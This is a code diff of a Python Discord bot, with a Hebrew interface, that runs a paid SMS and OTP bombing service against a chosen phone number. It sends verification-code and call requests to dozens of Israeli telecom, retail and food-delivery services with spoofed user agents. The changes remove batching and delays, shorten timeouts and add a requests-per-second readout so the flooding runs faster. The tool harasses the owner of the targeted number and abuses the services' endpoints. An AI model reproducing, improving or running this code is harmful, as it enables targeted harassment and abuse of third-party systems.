@@ -58,7 +58,6 @@ logging.basicConfig(level=logging.WARNING)
 
 active_missions = {}
 cooldown_tracker = {}
-stop_events = {}
 
 BROWSER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
@@ -171,7 +170,7 @@ async def send_request(session, url, form=None, json_data=None, headers_extra=No
         headers.update(headers_extra)
     
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         
         if method == "GET":
             async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
@@ -210,7 +209,7 @@ async def atmos_request(session, store_id, phone, origin="https://order.atmos.re
         "sec-fetch-site": "cross-site",
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         endpoint = "sendValidationCall" if is_call else "sendValidationCode"
         api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}"
         async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
@@ -221,15 +220,8 @@ async def atmos_request(session, store_id, phone, origin="https://order.atmos.re
         return False, tag, str(type(e).__name__)
 
 async def process_atmos_batch(session, target, stores, is_call=False):
-    results = []
-    batch = 3
-    for i in range(0, len(stores), batch):
-        group = stores[i:i + batch]
-        tasks = [atmos_request(session, sid, target, is_call=is_call) for sid in group]
-        res = await asyncio.gather(*tasks, return_exceptions=True)
-        results.extend(res)
-        await asyncio.sleep(0.5)
-    return results
+    tasks = [atmos_request(session, sid, target, is_call=is_call) for sid in stores]
+    return await asyncio.gather(*tasks, return_exceptions=True)
 
 async def claude_request(session, phone):
     tag = "claude"
@@ -249,7 +241,7 @@ async def claude_request(session, phone):
         h["cookie"] = CLAUDE_SESSION
     payload = {"phone_number": clean}
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
@@ -260,7 +252,7 @@ async def claude_request(session, phone):
 async def oshioshi_request(session, phone):
     tag = "oshioshi"
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         async with session.get("https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False) as resp:
             text = await resp.text()
             match = re.search(r'name="_token"\s+value="([^"]+)"', text)
@@ -295,7 +287,7 @@ async def freetv_request(session, phone):
         "Referer": "https://freetv.tv/"
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
@@ -312,7 +304,7 @@ async def webcut_request(session, phone):
         "User-Agent": random_agent()
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
@@ -332,7 +324,7 @@ async def freeivr_request(session, phone):
         "Referer": "https://freeivr.co.il/"
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
@@ -352,472 +344,7 @@ async def mitmachim_request(session, phone):
         "User-Agent": random_agent()
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def pelephone_request(session, phone):
-    tag = "pelephone"
-    url = "https://www.pelephone.co.il/login/api/login/otpphone/"
-    payload = {"phone": phone, "terms": True, "appId": "DIGITALMy"}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.pelephone.co.il",
-        "Referer": "https://www.pelephone.co.il/login/?u=DIGITALMy",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def cellcom_request(session, phone):
-    tag = "cellcom"
-    url = "https://www.cellcom.co.il/api/auth/sms"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.cellcom.co.il",
-        "Referer": "https://www.cellcom.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def partner_request(session, phone):
-    tag = "partner"
-    url = "https://www.partner.co.il/api/register"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.partner.co.il",
-        "Referer": "https://www.partner.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def hot_request(session, phone):
-    tag = "hot"
-    url = "https://www.hotmobile.co.il/api/verify"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.hotmobile.co.il",
-        "Referer": "https://www.hotmobile.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def bezeq_request(session, phone):
-    tag = "bezeq"
-    url = "https://www.bezeq.co.il/api/auth"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.bezeq.co.il",
-        "Referer": "https://www.bezeq.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def gett_request(session, phone, email):
-    tag = "gett"
-    url = "https://www.gett.com/il/wp-admin/admin-ajax.php"
-    data = {
-        "action": "business_reg_action",
-        "phone": phone,
-        "first_name": "cyber",
-        "last_name": "il",
-        "work_email": email,
-        "privacy_policy": "true"
-    }
-    h = {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://www.gett.com",
-        "Referer": "https://www.gett.com/il/start/?referrer=menu-button",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, data=data, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def shufersal_request(session, phone):
-    tag = "shufersal"
-    url = "https://www.shufersal.co.il/api/v1/auth/otp"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.shufersal.co.il",
-        "Referer": "https://www.shufersal.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def ramilevy_request(session, phone):
-    tag = "ramilevy"
-    url = "https://www.rami-levy.co.il/api/auth/sms"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.rami-levy.co.il",
-        "Referer": "https://www.rami-levy.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def victory_request(session, phone):
-    tag = "victory"
-    url = "https://www.victory.co.il/api/auth/sms"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.victory.co.il",
-        "Referer": "https://www.victory.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def tenbis_request(session, phone):
-    tag = "10bis"
-    url = "https://www.10bis.co.il/api/register"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.10bis.co.il",
-        "Referer": "https://www.10bis.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def mcdonalds_request(session, phone):
-    tag = "mcdonalds"
-    url = "https://www.mcdonalds.co.il/api/verify"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.mcdonalds.co.il",
-        "Referer": "https://www.mcdonalds.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def burgerking_request(session, phone):
-    tag = "burgerking"
-    url = "https://www.burgerking.co.il/api/auth"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.burgerking.co.il",
-        "Referer": "https://www.burgerking.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def kfc_request(session, phone):
-    tag = "kfc"
-    url = "https://www.kfc.co.il/api/sms"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.kfc.co.il",
-        "Referer": "https://www.kfc.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def pizzahut_request(session, phone):
-    tag = "pizzahut"
-    url = "https://www.pizza-hut.co.il/api/register"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.pizza-hut.co.il",
-        "Referer": "https://www.pizza-hut.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def dominos_request(session, phone):
-    tag = "dominos"
-    url = "https://www.dominos.co.il/api/auth/sms"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.dominos.co.il",
-        "Referer": "https://www.dominos.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def burgeranch_request(session, phone):
-    tag = "burgeranch"
-    url = "https://app.burgeranch.co.il/_a/aff_otp_auth"
-    form = f"phone={phone}"
-    h = {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://app.burgeranch.co.il",
-        "Referer": "https://app.burgeranch.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, data=form, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def pango_request(session, phone):
-    tag = "pango"
-    url = "https://api.pango.co.il/auth/otp"
-    payload = {"phoneNumber": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://pango.co.il",
-        "Referer": "https://pango.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def hopon_request(session, phone):
-    tag = "hopon"
-    url = "https://api.hopon.co.il/v0.15/1/isr/users"
-    payload = {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": phone, "phoneCall": False}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://hopon.co.il",
-        "Referer": "https://hopon.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def yad2_request(session, phone):
-    tag = "yad2"
-    url = "https://www.yad2.co.il/api/auth/register"
-    payload = {"phone": phone, "action": "send_sms"}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.yad2.co.il",
-        "Referer": "https://www.yad2.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def paybox_request(session, phone):
-    tag = "paybox"
-    url = "https://payboxapp.com/api/auth/otp"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://payboxapp.com",
-        "Referer": "https://payboxapp.com/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def superpharm_request(session, phone):
-    tag = "superpharm"
-    url = "https://www.super-pharm.co.il/api/sms"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.super-pharm.co.il",
-        "Referer": "https://www.super-pharm.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def zap_request(session, phone):
-    tag = "zap"
-    url = "https://www.zap.co.il/api/auth/sms"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.zap.co.il",
-        "Referer": "https://www.zap.co.il/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
-        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
-            await resp.read()
-            ok = 200 <= resp.status < 300
-            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
-    except Exception as e:
-        return False, tag, str(type(e).__name__)
-
-async def wolt_request(session, phone):
-    tag = "wolt"
-    url = "https://www.wolt.com/api/v1/verify"
-    payload = {"phone": phone}
-    h = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "Origin": "https://www.wolt.com",
-        "Referer": "https://www.wolt.com/",
-        "User-Agent": random_agent()
-    }
-    try:
-        timeout = aiohttp.ClientTimeout(total=8)
+        timeout = aiohttp.ClientTimeout(total=5)
         async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
@@ -884,29 +411,52 @@ async def run_all(phone: str):
             webcut_request(s, raw),
             freeivr_request(s, raw),
             mitmachim_request(s, raw),
-            pelephone_request(s, raw),
-            cellcom_request(s, raw),
-            partner_request(s, raw),
-            hot_request(s, raw),
-            bezeq_request(s, raw),
-            gett_request(s, formatted, random_email),
-            shufersal_request(s, raw),
-            ramilevy_request(s, raw),
-            victory_request(s, raw),
-            tenbis_request(s, raw),
-            mcdonalds_request(s, raw),
-            burgerking_request(s, raw),
-            kfc_request(s, raw),
-            pizzahut_request(s, raw),
-            dominos_request(s, raw),
-            burgeranch_request(s, raw),
-            pango_request(s, raw),
-            hopon_request(s, raw),
-            yad2_request(s, raw),
-            paybox_request(s, raw),
-            superpharm_request(s, raw),
-            zap_request(s, raw),
-            wolt_request(s, raw),
+            send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
+                json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
+            send_request(s, "https://www.cellcom.co.il/api/auth/sms",
+                json_data={"phone": raw}, tag="cellcom"),
+            send_request(s, "https://www.partner.co.il/api/register",
+                json_data={"phone": raw}, tag="partner"),
+            send_request(s, "https://www.hotmobile.co.il/api/verify",
+                json_data={"phone": raw}, tag="hot"),
+            send_request(s, "https://www.bezeq.co.il/api/auth",
+                json_data={"phone": raw}, tag="bezeq"),
+            send_request(s, "https://www.gett.com/il/wp-admin/admin-ajax.php",
+                data={"action": "business_reg_action", "phone": formatted, "first_name": "cyber", "last_name": "il", "work_email": random_email, "privacy_policy": "true"}, tag="gett"),
+            send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp",
+                json_data={"phone": raw}, tag="shufersal"),
+            send_request(s, "https://www.rami-levy.co.il/api/auth/sms",
+                json_data={"phone": raw}, tag="ramilevy"),
+            send_request(s, "https://www.victory.co.il/api/auth/sms",
+                json_data={"phone": raw}, tag="victory"),
+            send_request(s, "https://www.10bis.co.il/api/register",
+                json_data={"phone": raw}, tag="10bis"),
+            send_request(s, "https://www.mcdonalds.co.il/api/verify",
+                json_data={"phone": raw}, tag="mcdonalds"),
+            send_request(s, "https://www.burgerking.co.il/api/auth",
+                json_data={"phone": raw}, tag="burgerking"),
+            send_request(s, "https://www.kfc.co.il/api/sms",
+                json_data={"phone": raw}, tag="kfc"),
+            send_request(s, "https://www.pizza-hut.co.il/api/register",
+                json_data={"phone": raw}, tag="pizzahut"),
+            send_request(s, "https://www.dominos.co.il/api/auth/sms",
+                json_data={"phone": raw}, tag="dominos"),
+            send_request(s, "https://app.burgeranch.co.il/_a/aff_otp_auth",
+                form=f"phone={raw}", tag="burgeranch"),
+            send_request(s, "https://api.pango.co.il/auth/otp",
+                json_data={"phoneNumber": raw}, tag="pango"),
+            send_request(s, "https://api.hopon.co.il/v0.15/1/isr/users",
+                json_data={"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": raw, "phoneCall": False}, tag="hopon"),
+            send_request(s, "https://www.yad2.co.il/api/auth/register",
+                json_data={"phone": raw, "action": "send_sms"}, tag="yad2"),
+            send_request(s, "https://payboxapp.com/api/auth/otp",
+                json_data={"phone": raw}, tag="paybox"),
+            send_request(s, "https://www.super-pharm.co.il/api/sms",
+                json_data={"phone": raw}, tag="superpharm"),
+            send_request(s, "https://www.zap.co.il/api/auth/sms",
+                json_data={"phone": raw}, tag="zap"),
+            send_request(s, "https://www.wolt.com/api/v1/verify",
+                json_data={"phone": raw}, tag="wolt"),
             send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
                 form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                 headers_extra=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
@@ -1263,10 +813,9 @@ def create_gift_panel():
     return embed
 
 class StopAttack(discord.ui.View):
-    def __init__(self, user_id: int, mission_id: str = None):
+    def __init__(self, user_id: int):
         super().__init__(timeout=None)
         self.user_id = user_id
-        self.mission_id = mission_id
 
     @discord.ui.button(label="עצור ספאם", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_attack")
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1330,16 +879,16 @@ class ConfirmAttack(discord.ui.View):
                 total_failed += f
                 
                 if time.time() - last_update >= 3:
-                    remaining = int((end_time - time.time()) / 60)
+                    remaining = max(0, int((end_time - time.time()) / 60))
                     embed = discord.Embed(
                         title="🔄 ספאם בתהליך",
-                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ הצלחות: {total_success}\n❌ כשלונות: {total_failed}",
+                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ הצלחות: {total_success}\n❌ כשלונות: {total_failed}\n⚡ קצב: {int(total_success / max(1, time.time() - start_time))}/שנייה",
                         color=COLOR_WARNING
                     )
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                     last_update = time.time()
                 
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0)
 
             await apply_cooldown(self.phone)
             active_missions.pop(self.user_id, None)
@@ -1367,6 +916,7 @@ class ConfirmAttack(discord.ui.View):
             final.add_field(name="✅ הצלחות", value=str(total_success), inline=True)
             final.add_field(name="❌ כשלונות", value=str(total_failed), inline=True)
             final.add_field(name="💎 קרדיטים נותרים", value=bal, inline=True)
+            final.add_field(name="⚡ קצב ממוצע", value=f"{int(total_success / max(1, self.cost * 60))}/שנייה", inline=True)
             
             await interaction.edit_original_response(embed=final, view=None)
 
@@ -1693,7 +1243,7 @@ async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member,
         seconds = duration * 86400
         unit_text = f"{duration} ימים"
     elif unit in ["month", "months", "mon"]:
-        seconds = duration * 2592000  # 30 ימים
+        seconds = duration * 2592000
         unit_text = f"{duration} חודשים"
     else:
         await interaction.response.send_message("❌ יחידה לא תקינה. השתמש ב: minutes, hours, days, months", ephemeral=True)
